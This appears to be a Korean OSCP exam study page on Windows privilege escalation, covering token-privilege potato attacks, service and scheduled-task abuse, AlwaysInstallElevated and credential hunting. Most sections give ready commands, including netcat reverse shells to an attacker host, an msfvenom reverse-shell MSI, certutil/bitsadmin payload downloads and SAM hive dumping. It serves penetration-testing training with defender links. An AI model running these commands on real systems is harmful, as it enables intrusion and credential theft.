---
title: Windows 권한 상승
tags:
  - oscp
---

# Windows 권한 상승 { #windows-privilege-escalation }

<div class="dfir-meta" markdown>
**배점:** Windows standalone당 10점 (`proof.txt`) + AD 세트 호스트 · **최종 수정:** 2026-11-03
</div>

!!! abstract "한 문장 요약"
    낮은 권한 사용자에서 Administrator / SYSTEM으로: 토큰 권한부터 읽고(SeImpersonate → potato), WinPEAS를 돌린 뒤 서비스, 예약 작업, 저장된 크리덴셜, 설치 정책을 확인 — 커널 익스플로잇은 마지막.

!!! tip "실전 실행 참고"
    명령 선택·출력 해석·실패 진단은 [실전 종합 가이드](practical-guide.md#privesc), Windows·AD 프로토콜별 상세 사용법은 [Impacket 집중 가이드](impacket.md)를 참고하세요.

## 1. 개념 { #concept }

| 출처 | 왜 통하나 |
|---|---|
| **토큰 권한** | 서비스 계정(IIS, MSSQL)은 `SeImpersonatePrivilege` 를 가짐; `SeBackup` / `SeRestore` / `SeManageVolume` / `SeDebug` 도 각각 알려진 악용법이 있음 |
| **내가 영향을 줄 수 있는 SYSTEM 실행 대상** | 서비스 바이너리 / 경로 / 권한, 예약 작업 대상, DLL 검색 경로, AlwaysInstallElevated |
| **저장된 크리덴셜** | 저장된 자격 증명, PowerShell 히스토리, unattend 파일, 설정 파일, 자동 로그온, KeePass |
| **그룹 멤버십** | `Backup Operators`, `Server Operators`, `DnsAdmins`, UAC 뒤의 로컬 `Administrators` |
| **누락된 패치** | 로컬 익스플로잇이 알려진 오래된 빌드 — 최후의 수단 |

## 2. 주요 도구 { #tools }

| 도구 | 용도 | 시험 허용 여부 |
|---|---|---|
| **WinPEAS** | 폭넓은 자동 정보 수집 | 허용 |
| **PrivescCheck.ps1 / SharpUp** | 서비스 / 작업 / 레지스트리에 대한 두 번째 의견 | 허용 |
| **PrintSpoofer** | 프린트 스풀러 named pipe로 SeImpersonate → SYSTEM | 허용 |
| **GodPotato** (와 다른 potato) | DCOM / RPC로 SeImpersonate → SYSTEM, 새 빌드에서도 동작 | 허용 |
| **mimikatz** | 관리자 / SYSTEM이 된 뒤 크리덴셜 덤프 | 허용 → [AD › mimikatz](active-directory.md#mimikatz) |
| **LOLBAS** | 다운로드, 실행, 우회용 내장 바이너리 | 허용 (참고 사이트) |
| **msfvenom** | 대체 서비스 바이너리, DLL, MSI | 어디서나 허용 |

## 3. 시나리오 { #scenarios }

### 3.1 첫 5분 — 수동 확인 { #enumeration }

```powershell
whoami /priv                 # 토큰 권한 — 제일 먼저
whoami /groups               # 그룹 + 무결성 수준 (Medium / High)
systeminfo                   # OS 빌드, 핫픽스, 아키텍처
net user; net localgroup administrators
ipconfig /all                # 두 번째 NIC? → 피벗
netstat -ano | findstr LISTENING   # 로컬 전용 서비스
Get-ChildItem C:\Users\ -Force; dir C:\ -Force   # 이상한 폴더: C:\backup, C:\scripts, C:\inetpub
```

**볼 것:**

- `SeImpersonatePrivilege  Enabled` 또는 `SeAssignPrimaryTokenPrivilege` → 지금 바로 [potato](#token-privileges).
- `SeBackupPrivilege` → [SAM/SYSTEM 덤프](#sebackup).
- `Administrators` 인데 `Mandatory Label\Medium` → UAC 뒤의 관리자 → [UAC](#uac-kernel).
- `C:\` 나 `Program Files` 의 기본이 아닌 폴더 → 자작 소프트웨어, 자주 의도된 경로.

### 3.2 WinPEAS — 넓게 훑기 { #winpeas }

```powershell
iwr http://<KALI>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe | Tee-Object C:\Windows\Temp\wp.txt
```

**볼 것:** *Services Information*(수정 가능한 서비스, 따옴표 없는 경로), *Applications Information*(쓰기 가능한 설치 폴더), *Scheduled tasks*, *Interesting files and registry*(AutoLogon, unattend.xml, PuTTY / WinSCP 세션), *PowerShell history*, *AlwaysInstallElevated* 의 빨간 강조.

`.exe` 가 막히면 `.bat` 버전이나 `PrivescCheck.ps1`:

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```

### 3.3 SeImpersonatePrivilege → PrintSpoofer / GodPotato { #token-privileges }

**상황:** `iis apppool\...`, `nt service\mssqlserver`, 웹 셸, `xp_cmdshell` 로 얻은 셸 — 그리고 `whoami /priv` 에 **SeImpersonatePrivilege**.

```powershell
# PrintSpoofer — Print Spooler가 돌고 있어야 함 (Server 2016/2019, Win10에서 흔함)
.\PrintSpoofer64.exe -i -c cmd                                         # 대화형
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"      # 비대화형 셸

# GodPotato — 스풀러 불필요; .NET 버전에 맞는 빌드 선택
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"
```

**볼 것:** `whoami` 결과 `nt authority\system`. PrintSpoofer가 `[-] Operation failed` / pipe 없음 → 스풀러가 꺼져 있음 → GodPotato(또는 SweetPotato, JuicyPotatoNG 같은 다른 potato). 웹 셸에서는 `-i` 대화형 모드가 안 되니 항상 리버스 셸을 보내세요.

**다음:** `proof.txt` 를 챙기고, 넘어가기 전에 **루팅**(mimikatz / SAM) → [AD › 루팅](active-directory.md#looting).

방어자 관점과 동작 원리: [토큰 가장 / Potato](../../adversary/token-impersonation-potato.md) · [PrintNightmare](../../adversary/printnightmare.md).

### 3.4 SeBackupPrivilege / Backup Operators { #sebackup }

```powershell
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# 둘 다 내려받고 (evil-winrm: download ...), Kali에서:
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

**다음:** 로컬 Administrator NT 해시로 pass → `evil-winrm -i $IP -u Administrator -H <NT>`. DC에서는 같은 권한으로 (섀도 복사본을 통해) `NTDS.dit` 를 복사할 수 있어요 → [SAM / NTDS 추출](../../adversary/sam-ntds-extraction.md).

### 3.5 서비스 설정 오류 { #services }

**상황:** WinPEAS가 서비스를 표시했거나, `C:\Program Files\<Vendor>` 에 자작 서비스가 보임.

```powershell
Get-CimInstance Win32_Service | ? {$_.StartName -like '*LocalSystem*'} | select Name,State,PathName,StartMode
sc.exe qc <svc>
icacls "C:\Program Files\Vendor\svc.exe"          # Users / Everyone / 나에게 (F) 또는 (M)?
```

| 발견 | 익스플로잇 |
|---|---|
| **쓰기 가능한 서비스 바이너리**(`BUILTIN\Users:(M)`) | msfvenom exe로 바꾸고 서비스 재시작 |
| **약한 서비스 권한**(설정 변경 가능) | `sc.exe config <svc> binpath= "C:\Windows\Temp\rev.exe"` |
| **공백 있는 따옴표 없는 경로**(`C:\Program Files\My App\svc.exe`)와 쓰기 가능한 상위 폴더 | `C:\Program Files\My.exe`(또는 `My App\...` 접두) 심기 |
| 서비스가 로드하는 **쓰기 가능한 DLL 경로**(ProcMon / WinPEAS) | msfvenom `-f dll` 심기 |

```powershell
# 따옴표 없는 경로 찾기 (새 빌드엔 wmic 없음)
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '^"' -and $_.PathName -match ' .*\.exe' } | select Name,PathName,StartMode

# 재시작 — 시작/중지 권한 필요; 없으면 재부팅 대기 (SeShutdown이 있으면)
sc.exe stop <svc>; sc.exe start <svc>
Restart-Service <svc>
```

**볼 것:** `sc stop` 에 `Access is denied` → `StartMode` 가 `Auto` 인지, `shutdown /r /t 0` 이 되는지(`SeShutdownPrivilege`) 확인. 실제 업무라면 재부팅 전에 물어봐야 하고, 시험에서는 점수가 아니라 시간을 씁니다.

### 3.6 예약 작업 { #scheduled-tasks }

```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run.As Task.To.Run"
Get-ScheduledTask | ? {$_.Principal.UserId -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE'} | select TaskName,TaskPath
icacls C:\scripts\cleanup.ps1
```

**볼 것:** 관리자 / SYSTEM으로 실행되는데 스크립트(`C:\scripts\*.ps1`, `.bat`)를 내가 쓸 수 있는 작업. **다음:** 리버스 셸 줄을 덧붙이고 다음 실행을 기다리기.

### 3.7 AlwaysInstallElevated { #alwaysinstallelevated }

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

둘 다 `0x1` → 어떤 MSI든 SYSTEM으로 설치:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
```

```powershell
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### 3.8 저장된 크리덴셜 { #stored-credentials }

어떤 익스플로잇보다 빠른 경우가 많아요 — 파기 전에 먼저 보세요.

```powershell
cmdkey /list                                                # 저장된 자격 증명 → runas /savecred
runas /savecred /user:CORP\admin "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"
Get-Content (Get-PSReadlineOption).HistorySavePath          # PowerShell 히스토리 (읽을 수 있는 모든 사용자)
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
dir C:\Windows\Panther\Unattend*.xml, C:\Windows\Panther\unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Users,C:\inetpub,C:\xampp,C:\backup -Include *.config,*.xml,*.ini,*.txt,*.kdbx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -List
```

**볼 것:** 평문 비밀번호, `ConvertTo-SecureString` 줄, 히스토리의 `-Credential` 사용, unattend 파일의 base64, `.kdbx` → [크랙](password-attacks.md#john).

**다음:** 그 크리덴셜로 `runas`, `evil-winrm`, RDP, 다른 호스트에 `nxc`.

### 3.9 내장 바이너리 — LOLBAS { #lolbas }

업로드 도구나 PowerShell이 막혔을 때, [LOLBAS](https://lolbas-project.github.io/)에는 다운로드하거나 실행하는 서명된 Windows 바이너리가 정리돼 있어요.

```powershell
certutil -urlcache -split -f http://<KALI>/rev.exe C:\Windows\Temp\rev.exe   # 다운로드
bitsadmin /transfer j http://<KALI>/rev.exe C:\Windows\Temp\rev.exe            # 다운로드
```

방어자 관점: [LOLBins](../../adversary/lolbins.md).

### 3.10 UAC와 커널 { #uac-kernel }

- **관리자인데 medium 무결성**(`whoami /groups` 에 `Medium Mandatory Level`) → 권한 상승이 아니라 [UAC 우회](../../adversary/uac-bypass.md) 문제입니다. 관리자 비밀번호가 있으면 **evil-winrm / psexec** 로 로그인하는 게 더 쉬운 경우가 많아요. 바로 high 무결성 토큰을 줍니다.
- **커널 / 누락 패치**(`systeminfo` 기반): 빌드와 핫픽스를 알려진 로컬 권한 상승 CVE와 비교. 최후의 수단이고 revert가 필요할 수 있어요.

## 4. 자주 하는 실수 { #mistakes }

- **`whoami /priv` 를 안 읽고** WinPEAS 출력에 한 시간 — SeImpersonate가 처음부터 있었는데.
- **OS에 안 맞는 potato.** JuicyPotato는 Server 2019 / Win10 1809+에서 안 됩니다. PrintSpoofer나 GodPotato를 쓰세요.
- **64비트 Windows에서 32비트 셸** — 레지스트리와 `Program Files` 경로가 달라집니다. `[Environment]::Is64BitProcess` 확인.
- **재시작할 수 없는 서비스의 바이너리를 바꾸기** — 시작/중지 권한이나 자동 시작을 먼저 확인.
- 다른 사용자 프로필을 읽을 수 있게 됐는데 **그 사용자의 PowerShell 히스토리를 안 보기.**
- **루팅 없이 넘어가기.** MS01의 SYSTEM 셸에 MS02로 가는 AD 크리덴셜이 있습니다.

## 5. 시험 팁 { #exam-tips }

- proof 스크린샷: 대화형 셸에서 `type C:\Users\Administrator\Desktop\proof.txt`, `whoami`, `ipconfig` 를 한 화면에(웹 셸은 인정 안 됨 — [플래그 규칙](exam-format.md#flag-rules)).
- tools 폴더에 `PrintSpoofer64.exe` 와 `GodPotato-NET4.exe`(그리고 `NET35`)를 둘 다 넣어 두세요.
- 올린 파일과 바꾼 서비스 / 작업을 전부 기록하세요 — 리포트의 정리(clean-up) 항목에 들어갑니다.

## 체크리스트 { #checklist }

- [ ] `whoami /priv` 읽기 → `SeImpersonate`/`SeAssignPrimaryToken` 이면 potato, `SeBackup` 이면 하이브
- [ ] WinPEAS / PrivescCheck 실행하고 읽기
- [ ] 서비스 확인(쓰기 가능한 바이너리, 따옴표 없는 경로, 약한 권한, DLL)
- [ ] 예약 작업 확인
- [ ] AlwaysInstallElevated 키 확인
- [ ] 저장된 크리덴셜 검색(cmdkey, 히스토리, 레지스트리, unattend, 파일)
- [ ] 누락 패치용 `systeminfo` 기록(마지막 옵션)
- [ ] 넘어가기 전에 호스트 루팅

## 관련 페이지 { #related-pages }

- [시험 흐름](exam-workflow.md) · [셸과 파일 전송](shells-file-transfer.md) · [Active Directory](active-directory.md)
- 방어자 관점: [토큰 가장 / Potato](../../adversary/token-impersonation-potato.md) · [UAC 우회](../../adversary/uac-bypass.md) · [SAM / NTDS 추출](../../adversary/sam-ntds-extraction.md) · [LSASS 덤프](../../adversary/lsass-dumping.md) · [LOLBins](../../adversary/lolbins.md)
- 같은 행동이 남기는 Windows 아티팩트: [레지스트리 키](../../windows/registry-keys.md) · [이벤트 로그](../../windows/event-logs.md) · [Prefetch](../../windows/prefetch.md)
- [Red Team: 지속성](../../redteam/persistence.md) · [방법론과 습관](methodology.md)

## 참고 자료 { #references }

- [LOLBAS](https://lolbas-project.github.io/)
- [PEASS-ng (WinPEAS)](https://github.com/peass-ng/PEASS-ng)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) · [GodPotato](https://github.com/BeichenDream/GodPotato)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
